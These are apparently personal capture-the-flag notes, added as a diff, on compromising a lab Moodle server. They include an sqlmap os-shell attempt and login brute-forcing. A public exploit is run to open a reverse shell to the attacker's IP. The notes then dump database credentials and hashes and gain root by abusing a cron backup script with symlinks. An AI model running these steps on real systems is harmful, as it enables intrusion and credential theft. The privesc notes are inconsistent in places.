@@ -1,0 +1,114 @@
+---PORT ENUM---
+Scanning 1 hosts [65535 ports/host]
+Discovered open port 80/tcp on 10.10.10.153
+PORT   STATE SERVICE VERSION
+80/tcp open  http    Apache httpd 2.4.25 ((Debian))
+|_http-server-header: Apache/2.4.25 (Debian)
+|_http-title: Blackhat highschool
+
+---GOBUSTER---
+/ (lowercase-medium.txt):
+  /images (Status: 200)
+  /css (Status: 200)
+  /manual (Status: 200)
+  /js (Status: 200)
+  /javascript (Status: 403)
+  /fonts (Status: 200)
+  /phpmyadmin (Status: 403)
+  /moodle (Status: 200)
+  /server-status (Status: 403)
+
+---ATTEMPTS---
+trying sql injection
+*sqlmap -u http://10.10.10.153/moodle/user/profile.php?id=3 -a --os-shell -v --cookie='MoodleSession=9ucjnkrqc5f1b100t5pk4buhb4' (unsuccessful)
+openning all images is /images found 5.png that is the only one that doesnt open
+*wget 10.10.10.153/images/5.png
+*strings 5.png:
+  Hi Servicedesk,
+  I forgot the last charachter of my password. The only part I remembered is Th4C00lTheacha.
+  Could you guys figure out what the last charachter is, or just reset it?
+  Thanks,
+  Giovanni
+bruteforcing the login Giovanni/Th4C00lTheacha + char (i)
+[80][http-post-form] host: 10.10.10.153   login: Giovanni   password: Th4C00lTheacha#
+done!
+
+in messages (by giovanni):
+  Hey admin.
+  How am I supposed to create a quiz? I'm kinda in a hurry since I need this for tomorrow.
+  Kind regards,
+  Giovanni
+
+on exploitdb found https://www.exploit-db.com/exploits/46551 that exploits the function to add a quizz:
+*php 46551.php url=10.10.10.153 user=Giovanni pass=Th4C00lTheacha# ip=10.10.14.27 port=5555 course=2
+done!
+
+---PRIVESC---
+*./linpeas.sh
+  /var/www/moodledata/sessions/sess_vv7da843vgs47a62o7jt9q8fc5
+
+nothing usefull with -perm -4000
+
+in /etc/phpmyadmin/config-db.php:
+  $dbuser='phpmyadmin';
+  $dbpass='Welkom1!';
+  $basepath='';
+  $dbname='phpmyadmin';
+  $dbserver='localhost';
+  $dbport='3306';
+  $dbtype='mysql';
+nothing found on the db
+
+int /var/www/html/moodle/config.php:
+  $CFG->dbtype    = 'mariadb';
+  $CFG->dblibrary = 'native';
+  $CFG->dbhost    = 'localhost';
+  $CFG->dbname    = 'moodle';
+  $CFG->dbuser    = 'root';
+  $CFG->dbpass    = 'Welkom1!';
+*select User,Password from user;
+  +------------+-------------------------------------------+
+  | User       | Password                                  |
+  +------------+-------------------------------------------+
+  | root       | *F435725A173757E57BD36B09048B8B610FF4D0C4 |
+  | phpmyadmin | *F435725A173757E57BD36B09048B8B610FF4D0C4 |
+  +------------+-------------------------------------------+
+*select username, password from mdl_user;
++-------------+--------------------------------------------------------------+
+| username    | password                                                     |
++-------------+--------------------------------------------------------------+
+| guest       | $2y$10$ywuE5gDlAlaCu9R0w7pKW.UCB0jUH6ZVKcitP3gMtUNrAebiGMOdO |
+| admin       | $2y$10$7VPsdU9/9y2J4Mynlt6vM.a4coqHRXsNTOq/1aA6wCWTsF2wtrDO2 |
+| giovanni    | $2y$10$38V6kI7LNudORa7lBAT0q.vsQsv4PemY7rf/M1Zkj/i1VqLO0FSYO |
+| Giovannibak | 7a860966115182402ed06375cf0a22af                             |
++-------------+--------------------------------------------------------------+
+Giovannibak: 7a860966115182402ed06375cf0a22af:expelled
+*su giovanni
+done!
+*cat /home/giovanni/user.txt
+
+*./linpeas
+  -rwxr-xr-x 1 root root 138 Jun 27  2018 /usr/bin/backup.sh
+
+*./pspy64
+  2020/09/09 16:18:01 CMD: UID=0    PID=39880  | /usr/sbin/CRON -f 
+  2020/09/09 16:18:01 CMD: UID=0    PID=39881  | /usr/sbin/CRON -f 
+  2020/09/09 16:18:01 CMD: UID=0    PID=39882  | /bin/sh -c /usr/bin/backup.sh 
+  2020/09/09 16:18:01 CMD: UID=0    PID=39883  | /bin/bash /usr/bin/backup.sh 
+  2020/09/09 16:18:01 CMD: UID=0    PID=39884  | tar -czvf tmp/backup_courses.tar.gz courses/algebra 
+  2020/09/09 16:18:01 CMD: UID=0    PID=39885  | /bin/sh -c gzip 
+  2020/09/09 16:18:01 CMD: UID=0    PID=39886  | tar -xf backup_courses.tar.gz 
+  2020/09/09 16:18:01 CMD: UID=0    PID=39887  | tar -xf backup_courses.tar.gz 
+  2020/09/09 16:18:01 CMD: UID=0    PID=39888  | /bin/bash /usr/bin/backup.sh 
+*cat /usr/bin/backup.sh
+  #!/bin/bash
+  cd /home/giovanni/work;
+  tar -czvf tmp/backup_courses.tar.gz courses/*;
+  cd tmp;
+  tar -xf backup_courses.tar.gz;
+  chmod 777 * -R;
+
+to get a root shell: just 'rm -r tmp' and 'ln -s /etc/passwd tmp' so that when the script run 'chmod 777 * -R' it will git all permissions to /etc/passwd and change the password using 'openssl passwd X', copy to /etc/passwd and 'su root' with the new pass
+
+so backup.sh go to /holme/giovanni/work, compress the courses/ dir to tmp/backup_courses.tar.gz. Then go to tmp and decompress the file giving 777 permisions to everyfile. To exploit this, just need to create a link from dir courses to /root, in this way the backup.sh will compress everything in (courses -> /root) and then decompress. the key to this is backup.sh runs as root
+*cat /home/givanni/work/tmp/root.txt
